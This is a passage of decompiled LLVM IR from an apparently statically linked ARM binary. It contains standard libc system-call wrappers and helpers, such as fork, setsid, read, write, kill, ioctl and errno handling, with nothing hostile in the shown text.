bb:                                               ; preds = %dec_label_pc_f558
  store i32 %v0_f558, i32* @r7, align 4
  br label %dec_label_pc_f57c

bb16:                                             ; preds = %dec_label_pc_f558
  store i32 4096, i32* @r7, align 4
  br label %dec_label_pc_f57c

dec_label_pc_f56c:                                ; preds = %entry
  store i32 %arg2, i32* @r7, align 4
  br i1 %v2_f53c, label %dec_label_pc_f57c, label %bb17

bb17:                                             ; preds = %dec_label_pc_f56c
  br label %dec_label_pc_f590

dec_label_pc_f57c:                                ; preds = %dec_label_pc_f56c, %bb, %bb16
  %v0_f57c = phi i32 [ %v0_f558, %bb ], [ 4096, %bb16 ], [ %arg2, %dec_label_pc_f56c ]
  %v1_f580 = call i32 @malloc(i32 %v0_f57c)
  %v2_f584 = icmp eq i32 %v1_f580, 0
  br i1 %v2_f584, label %dec_label_pc_f600, label %dec_label_pc_f58c

dec_label_pc_f58c:                                ; preds = %dec_label_pc_f57c
  br label %dec_label_pc_f590

dec_label_pc_f590:                                ; preds = %bb17, %dec_label_pc_f58c
  %storemerge = phi i32 [ %arg1, %bb17 ], [ %v1_f580, %dec_label_pc_f58c ]
  %v0_f5d4 = phi i32 [ %arg1, %bb17 ], [ %v1_f580, %dec_label_pc_f58c ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 %v0_f5d4, i32* @r7, align 4
  %tmp = icmp ult i32 %v0_f5d4, -4095
  br i1 %tmp, label %dec_label_pc_f5bc, label %dec_label_pc_f5ac

dec_label_pc_f5ac:                                ; preds = %dec_label_pc_f590
  %v0_f5ac = call i32 @__GI___errno_location()
  %v0_f5b0 = load i32, i32* @r7, align 4
  %v1_f5b0 = sub i32 0, %v0_f5b0
  %v2_f5b4 = inttoptr i32 %v0_f5ac to i32*
  store i32 %v1_f5b0, i32* %v2_f5b4, align 4
  br label %dec_label_pc_f5ec

dec_label_pc_f5bc:                                ; preds = %dec_label_pc_f590
  %v1_f5bc = icmp slt i32 %v0_f5d4, 0
  br i1 %v1_f5bc, label %dec_label_pc_f5ec, label %dec_label_pc_f5c4

dec_label_pc_f5c4:                                ; preds = %dec_label_pc_f5bc
  %v0_f5c4 = load i32, i32* @r4, align 4
  %v2_f5c4 = icmp eq i32 %v0_f5c4, 0
  br i1 %v2_f5c4, label %bb18, label %dec_label_pc_f5e0.thread7

dec_label_pc_f5e0.thread7:                        ; preds = %dec_label_pc_f5c4
  br label %dec_label_pc_f604

bb18:                                             ; preds = %dec_label_pc_f5c4
  %v1_f5c8 = load i32, i32* @r6, align 4
  %v3_f5c8 = icmp eq i32 %v1_f5c8, 0
  br i1 %v3_f5c8, label %dec_label_pc_f5e0, label %dec_label_pc_f5e0.thread

dec_label_pc_f5e0.thread:                         ; preds = %bb18
  br label %bb19

dec_label_pc_f5e0:                                ; preds = %bb18
  %v2_f5d8 = inttoptr i32 %v0_f5d4 to i32*
  %v3_f5d8 = call i32 @realloc(i32* %v2_f5d8, i32 %v0_f5d4)
  store i32 %v3_f5d8, i32* @r4, align 4
  %v2_f5e0 = icmp eq i32 %v3_f5d8, 0
  br i1 %v2_f5e0, label %dec_label_pc_f5e0.bb19_crit_edge, label %dec_label_pc_f604

dec_label_pc_f5e0.bb19_crit_edge:                 ; preds = %dec_label_pc_f5e0
  %v1_f5e4.pre = load i32, i32* @r5, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_f5e0.bb19_crit_edge, %dec_label_pc_f5e0.thread
  %v1_f5e4 = phi i32 [ %v1_f5e4.pre, %dec_label_pc_f5e0.bb19_crit_edge ], [ %v0_f5d4, %dec_label_pc_f5e0.thread ]
  store i32 %v1_f5e4, i32* @r4, align 4
  br label %dec_label_pc_f604

dec_label_pc_f5ec:                                ; preds = %dec_label_pc_f5bc, %dec_label_pc_f5ac
  %v0_f5ec = load i32, i32* @r4, align 4
  %v2_f5ec = icmp eq i32 %v0_f5ec, 0
  br i1 %v2_f5ec, label %dec_label_pc_f5f4, label %dec_label_pc_f600

dec_label_pc_f5f4:                                ; preds = %dec_label_pc_f5ec
  %v0_f5f4 = load i32, i32* @r5, align 4
  store i32 %v0_f5f4, i32* @r0, align 4
  %v0_f5f8 = call i32 @free()
  br label %dec_label_pc_f604

dec_label_pc_f600:                                ; preds = %dec_label_pc_f5ec, %dec_label_pc_f57c
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_f604

dec_label_pc_f604:                                ; preds = %dec_label_pc_f5e0.thread7, %bb19, %dec_label_pc_f5e0, %dec_label_pc_f5f4, %dec_label_pc_f544, %dec_label_pc_f600
  %v0_f604 = load i32, i32* @r4, align 4
  store i32 %v3_f528, i32* @r4, align 4
  store i32 %v6_f528, i32* @r5, align 4
  store i32 %v9_f528, i32* @r6, align 4
  store i32 %v12_f528, i32* @r7, align 4
  ret i32 %v0_f604

; uselistorder directives
  uselistorder i32 %v0_f5d4, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v1_f580, { 1, 0, 2 }
  uselistorder i32 %v0_f558, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_f604, { 5, 3, 1, 2, 0, 4 }
  uselistorder label %dec_label_pc_f590, { 1, 0 }
  uselistorder label %dec_label_pc_f57c, { 0, 2, 1 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_f620 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 96) to i32*), align 4
  %v1_f624 = inttoptr i32 %v4_f620 to i32*
  %v2_f624 = load i32, i32* %v1_f624, align 4
  %v2_f628 = icmp eq i32 %v2_f624, 0
  br i1 %v2_f628, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_f630 = phi i32 [ %v2_f624, %entry ], [ 4096, %bb ]
  ret i32 %v1_f630

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI_getpid() local_unnamed_addr {
entry:
  %v1_f64c = load i32, i32* @r0, align 4
  ret i32 %v1_f64c
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_f654 = ptrtoint i32* %stack_var_-16 to i32
  %v2_f664 = call i32 @gettimeofday(i32 %v2_f654, i32 0)
  %v2_f668 = load i32, i32* %stack_var_-16, align 4
  %v2_f66c = icmp eq i32* %arg1, null
  br i1 %v2_f66c, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_f668, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_f668

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_f6b4, label %dec_label_pc_f6a4

dec_label_pc_f6a4:                                ; preds = %entry
  %v0_f6a4 = call i32 @__GI___errno_location()
  %v0_f6a8 = load i32, i32* %r4.global-to-local, align 4
  %v1_f6a8 = sub i32 0, %v0_f6a8
  %v2_f6ac = inttoptr i32 %v0_f6a4 to i32*
  store i32 %v1_f6a8, i32* %v2_f6ac, align 4
  br label %dec_label_pc_f6b4

dec_label_pc_f6b4:                                ; preds = %entry, %dec_label_pc_f6a4
  %v1_f6bc = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_f6a4 ]
  ret i32 %v1_f6bc

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f6b4, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f6c0 = load i32, i32* @r7, align 4
  store i32 %v3_f6c0, i32* %stack_var_-8, align 4
  %v0_f6cc = load i32, i32* @r0, align 4
  store i32 %v0_f6cc, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f6cc, -4095
  br i1 %tmp, label %dec_label_pc_f6ec, label %dec_label_pc_f6dc

dec_label_pc_f6dc:                                ; preds = %entry
  %v0_f6dc = call i32 @__GI___errno_location()
  %v0_f6e0 = load i32, i32* %r7.global-to-local, align 4
  %v1_f6e0 = sub i32 0, %v0_f6e0
  %v2_f6e4 = inttoptr i32 %v0_f6dc to i32*
  store i32 %v1_f6e0, i32* %v2_f6e4, align 4
  %v2_f6ec.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f6ec

dec_label_pc_f6ec:                                ; preds = %entry, %dec_label_pc_f6dc
  %v1_f6f0 = phi i32 [ %v0_f6cc, %entry ], [ -1, %dec_label_pc_f6dc ]
  %v2_f6ec = phi i32 [ %v3_f6c0, %entry ], [ %v2_f6ec.pre, %dec_label_pc_f6dc ]
  store i32 %v2_f6ec, i32* @r7, align 4
  ret i32 %v1_f6f0

; uselistorder directives
  uselistorder i32 %v0_f6cc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f6ec, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_f700 = call i32 @wait4()
  ret i32 %v0_f700
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_f740, label %dec_label_pc_f730

dec_label_pc_f730:                                ; preds = %entry
  %v0_f730 = call i32 @__GI___errno_location()
  %v0_f734 = load i32, i32* %r4.global-to-local, align 4
  %v1_f734 = sub i32 0, %v0_f734
  %v2_f738 = inttoptr i32 %v0_f730 to i32*
  store i32 %v1_f734, i32* %v2_f738, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f740

dec_label_pc_f740:                                ; preds = %entry, %dec_label_pc_f730
  %v0_f740 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_f730 ]
  ret i32 %v0_f740

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f740, { 1, 0 }
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f750 = load i32, i32* @r7, align 4
  store i32 %v3_f750, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_f778, label %dec_label_pc_f768

dec_label_pc_f768:                                ; preds = %entry
  %v0_f768 = call i32 @__GI___errno_location()
  %v0_f76c = load i32, i32* %r7.global-to-local, align 4
  %v1_f76c = sub i32 0, %v0_f76c
  %v2_f770 = inttoptr i32 %v0_f768 to i32*
  store i32 %v1_f76c, i32* %v2_f770, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_f77c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f778

dec_label_pc_f778:                                ; preds = %entry, %dec_label_pc_f768
  %v2_f77c = phi i32 [ %v3_f750, %entry ], [ %v2_f77c.pre, %dec_label_pc_f768 ]
  %v0_f778 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_f768 ]
  store i32 %v2_f77c, i32* @r7, align 4
  ret i32 %v0_f778

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f778, { 1, 0 }
}

define i32 @__GI_read(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f784 = load i32, i32* @r7, align 4
  store i32 %v3_f784, i32* %stack_var_-8, align 4
  %v0_f790 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f790, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f790, -4095
  br i1 %tmp, label %dec_label_pc_f7b0, label %dec_label_pc_f7a0

dec_label_pc_f7a0:                                ; preds = %entry
  %v0_f7a0 = call i32 @__GI___errno_location()
  %v0_f7a4 = load i32, i32* %r7.global-to-local, align 4
  %v1_f7a4 = sub i32 0, %v0_f7a4
  %v2_f7a8 = inttoptr i32 %v0_f7a0 to i32*
  store i32 %v1_f7a4, i32* %v2_f7a8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_f7b0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f7b0

dec_label_pc_f7b0:                                ; preds = %entry, %dec_label_pc_f7a0
  %v1_f7b4 = phi i32 [ %v0_f790, %entry ], [ -1, %dec_label_pc_f7a0 ]
  %v2_f7b0 = phi i32 [ %v3_f784, %entry ], [ %v2_f7b0.pre, %dec_label_pc_f7a0 ]
  store i32 %v2_f7b0, i32* @r7, align 4
  ret i32 %v1_f7b4

; uselistorder directives
  uselistorder i32 %v0_f790, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f7b0, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_f7bc = ptrtoint i32* %stack_var_-16 to i32
  %v2_f7c8 = call i32 @getrlimit(i32 7, i32 %v2_f7bc)
  %v1_f7cc = icmp slt i32 %v2_f7c8, 0
  %v5_f7d0 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_f7cc, i32 256, i32 %v5_f7d0
  ret i32 %storemerge
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f7e4 = load i32, i32* @r7, align 4
  store i32 %v3_f7e4, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_f80c, label %dec_label_pc_f7fc

dec_label_pc_f7fc:                                ; preds = %entry
  %v0_f7fc = call i32 @__GI___errno_location()
  %v0_f800 = load i32, i32* %r7.global-to-local, align 4
  %v1_f800 = sub i32 0, %v0_f800
  %v2_f804 = inttoptr i32 %v0_f7fc to i32*
  store i32 %v1_f800, i32* %v2_f804, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_f810.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f80c

dec_label_pc_f80c:                                ; preds = %entry, %dec_label_pc_f7fc
  %v2_f810 = phi i32 [ %v3_f7e4, %entry ], [ %v2_f810.pre, %dec_label_pc_f7fc ]
  %v0_f80c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_f7fc ]
  store i32 %v2_f810, i32* @r7, align 4
  ret i32 %v0_f80c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f80c, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f818 = load i32, i32* @r7, align 4
  store i32 %v3_f818, i32* %stack_var_-8, align 4
  %v0_f824 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f824, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f824, -4095
  br i1 %tmp, label %dec_label_pc_f844, label %dec_label_pc_f834

dec_label_pc_f834:                                ; preds = %entry
  %v0_f834 = call i32 @__GI___errno_location()
  %v0_f838 = load i32, i32* %r7.global-to-local, align 4
  %v1_f838 = sub i32 0, %v0_f838
  %v2_f83c = inttoptr i32 %v0_f834 to i32*
  store i32 %v1_f838, i32* %v2_f83c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_f844.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f844

dec_label_pc_f844:                                ; preds = %entry, %dec_label_pc_f834
  %v1_f848 = phi i32 [ %v0_f824, %entry ], [ -1, %dec_label_pc_f834 ]
  %v2_f844 = phi i32 [ %v3_f818, %entry ], [ %v2_f844.pre, %dec_label_pc_f834 ]
  store i32 %v2_f844, i32* @r7, align 4
  ret i32 %v1_f848

; uselistorder directives
  uselistorder i32 %v0_f824, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f844, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_f888 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f888, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f888, -4095
  br i1 %tmp, label %dec_label_pc_f8a8, label %dec_label_pc_f898

dec_label_pc_f898:                                ; preds = %entry
  %v0_f898 = call i32 @__GI___errno_location()
  %v0_f89c = load i32, i32* %r7.global-to-local, align 4
  %v1_f89c = sub i32 0, %v0_f89c
  %v2_f8a0 = inttoptr i32 %v0_f898 to i32*
  store i32 %v1_f89c, i32* %v2_f8a0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f8a8

dec_label_pc_f8a8:                                ; preds = %entry, %dec_label_pc_f898
  %v1_f8b4 = phi i32 [ %v0_f888, %entry ], [ -1, %dec_label_pc_f898 ]
  ret i32 %v1_f8b4

; uselistorder directives
  uselistorder i32 %v0_f888, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f8a8, { 1, 0 }
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_f8f4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f8f4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f8f4, -4095
  br i1 %tmp, label %dec_label_pc_f914, label %dec_label_pc_f904

dec_label_pc_f904:                                ; preds = %entry
  %v0_f904 = call i32 @__GI___errno_location()
  %v0_f908 = load i32, i32* %r7.global-to-local, align 4
  %v1_f908 = sub i32 0, %v0_f908
  %v2_f90c = inttoptr i32 %v0_f904 to i32*
  store i32 %v1_f908, i32* %v2_f90c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f914

dec_label_pc_f914:                                ; preds = %entry, %dec_label_pc_f904
  %v1_f920 = phi i32 [ %v0_f8f4, %entry ], [ -1, %dec_label_pc_f904 ]
  ret i32 %v1_f920

; uselistorder directives
  uselistorder i32 %v0_f8f4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f914, { 1, 0 }
}

define i32 @__GI_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f924 = load i32, i32* @r7, align 4
  store i32 %v3_f924, i32* %stack_var_-8, align 4
  %v0_f930 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f930, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f930, -4095
  br i1 %tmp, label %dec_label_pc_f950, label %dec_label_pc_f940

dec_label_pc_f940:                                ; preds = %entry
  %v0_f940 = call i32 @__GI___errno_location()
  %v0_f944 = load i32, i32* %r7.global-to-local, align 4
  %v1_f944 = sub i32 0, %v0_f944
  %v2_f948 = inttoptr i32 %v0_f940 to i32*
  store i32 %v1_f944, i32* %v2_f948, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_f950.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f950

dec_label_pc_f950:                                ; preds = %entry, %dec_label_pc_f940
  %v1_f954 = phi i32 [ %v0_f930, %entry ], [ -1, %dec_label_pc_f940 ]
  %v2_f950 = phi i32 [ %v3_f924, %entry ], [ %v2_f950.pre, %dec_label_pc_f940 ]
  store i32 %v2_f950, i32* @r7, align 4
  ret i32 %v1_f954

; uselistorder directives
  uselistorder i32 %v0_f930, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f950, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f958 = load i32, i32* @r7, align 4
  store i32 %v3_f958, i32* %stack_var_-8, align 4
  %v0_f964 = load i32, i32* @r0, align 4
  store i32 %v0_f964, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f964, -4095
  br i1 %tmp, label %dec_label_pc_f984, label %dec_label_pc_f974

dec_label_pc_f974:                                ; preds = %entry
  %v0_f974 = call i32 @__GI___errno_location()
  %v0_f978 = load i32, i32* %r7.global-to-local, align 4
  %v1_f978 = sub i32 0, %v0_f978
  %v2_f97c = inttoptr i32 %v0_f974 to i32*
  store i32 %v1_f978, i32* %v2_f97c, align 4
  %v2_f984.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f984

dec_label_pc_f984:                                ; preds = %entry, %dec_label_pc_f974
  %v1_f988 = phi i32 [ %v0_f964, %entry ], [ -1, %dec_label_pc_f974 ]
  %v2_f984 = phi i32 [ %v3_f958, %entry ], [ %v2_f984.pre, %dec_label_pc_f974 ]
  store i32 %v2_f984, i32* @r7, align 4
  ret i32 %v1_f988

; uselistorder directives
  uselistorder i32 %v0_f964, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f984, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v9_f98c = load i32, i32* @r3, align 4
  store i32 %v9_f98c, i32* %stack_var_-4, align 4
  %v2_f998 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_f998, i32* @r3, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_f9cc, label %dec_label_pc_f9bc

dec_label_pc_f9bc:                                ; preds = %entry
  %v0_f9bc = call i32 @__GI___errno_location()
  %v0_f9c0 = load i32, i32* %r7.global-to-local, align 4
  %v1_f9c0 = sub i32 0, %v0_f9c0
  store i32 %v1_f9c0, i32* @r3, align 4
  %v2_f9c4 = inttoptr i32 %v0_f9bc to i32*
  store i32 %v1_f9c0, i32* %v2_f9c4, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_f9cc

dec_label_pc_f9cc:                                ; preds = %entry, %dec_label_pc_f9bc
  %v0_f9cc = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_f9bc ]
  ret i32 %v0_f9cc

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f9cc, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f9e4.outer

dec_label_pc_f9e4.outer:                          ; preds = %dec_label_pc_f9fc, %entry
  %v0_f9e4.ph = phi i32 [ %v0_f9e4.pre.pre, %dec_label_pc_f9fc ], [ %arg1, %entry ]
  %tmp = icmp ult i32 %v0_f9e4.ph, -4095
  br label %dec_label_pc_f9e4

dec_label_pc_f9e4:                                ; preds = %dec_label_pc_f9e4.outer, %dec_label_pc_f9e4
  br i1 %tmp, label %dec_label_pc_f9e4, label %dec_label_pc_f9fc

dec_label_pc_f9fc:                                ; preds = %dec_label_pc_f9e4
  %v0_f9fc = call i32 @__GI___errno_location()
  %v1_fa00 = sub i32 0, %v0_f9e4.ph
  %v2_fa04 = inttoptr i32 %v0_f9fc to i32*
  store i32 %v1_fa00, i32* %v2_fa04, align 4
  %v0_f9e4.pre.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f9e4.outer

; uselistorder directives
  uselistorder i32 %v0_f9e4.ph, { 1, 0 }
  uselistorder label %dec_label_pc_f9e4, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fa0c = load i32, i32* @r7, align 4
  store i32 %v3_fa0c, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_fa38, label %dec_label_pc_fa28

dec_label_pc_fa28:                                ; preds = %entry
  %v0_fa28 = call i32 @__GI___errno_location()
  %v0_fa2c = load i32, i32* %r7.global-to-local, align 4
  %v1_fa2c = sub i32 0, %v0_fa2c
  %v2_fa30 = inttoptr i32 %v0_fa28 to i32*
  store i32 %v1_fa2c, i32* %v2_fa30, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_fa3c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_fa38

dec_label_pc_fa38:                                ; preds = %entry, %dec_label_pc_fa28
  %v2_fa3c = phi i32 [ %v3_fa0c, %entry ], [ %v2_fa3c.pre, %dec_label_pc_fa28 ]
  %v0_fa38 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_fa28 ]
  store i32 %v2_fa3c, i32* @r7, align 4
  ret i32 %v0_fa38

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fa38, { 1, 0 }
}

define i32 @__GI_close(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fa44 = load i32, i32* @r7, align 4
  store i32 %v3_fa44, i32* %stack_var_-8, align 4
  %v0_fa50 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_fa50, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_fa50, -4095
  br i1 %tmp, label %dec_label_pc_fa70, label %dec_label_pc_fa60

dec_label_pc_fa60:                                ; preds = %entry
  %v0_fa60 = call i32 @__GI___errno_location()
  %v0_fa64 = load i32, i32* %r7.global-to-local, align 4
  %v1_fa64 = sub i32 0, %v0_fa64
  %v2_fa68 = inttoptr i32 %v0_fa60 to i32*
  store i32 %v1_fa64, i32* %v2_fa68, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_fa70.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_fa70

dec_label_pc_fa70:                                ; preds = %entry, %dec_label_pc_fa60
  %v1_fa74 = phi i32 [ %v0_fa50, %entry ], [ -1, %dec_label_pc_fa60 ]
  %v2_fa70 = phi i32 [ %v3_fa44, %entry ], [ %v2_fa70.pre, %dec_label_pc_fa60 ]
  store i32 %v2_fa70, i32* @r7, align 4
  ret i32 %v1_fa74

; uselistorder directives
  uselistorder i32 %v0_fa50, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fa70, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v4_fa84 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 524) to i32*), align 4
  %v2_fa88 = mul i32 %arg1, 2
  %v2_fa8c = add i32 %v4_fa84, %v2_fa88
  %v3_fa8c = inttoptr i32 %v2_fa8c to i16*
  %v4_fa8c = load i16, i16* %v3_fa8c, align 2
  %v6_fa8c = zext i16 %v4_fa8c to i32
  %v1_fa90 = and i32 %v6_fa8c, 32
  ret i32 %v1_fa90
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_faa4 = add i32 %arg1, 128
  %v2_faa8 = icmp ugt i32 %v1_faa4, 383
  %v0_fab0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_faa8, i32 %v0_fab0)
  %v4_fab8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 532) to i32*), align 4
  %v2_fabc = mul i32 %arg1, 2
  %v2_fac0 = add i32 %v4_fab8, %v2_fabc
  %v3_fac0 = inttoptr i32 %v2_fac0 to i16*
  %v4_fac0 = load i16, i16* %v3_fac0, align 2
  %v6_fac0 = sext i16 %v4_fac0 to i32
  ret i32 %v6_fac0
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* @r3, align 4
  ret i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 26304)
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
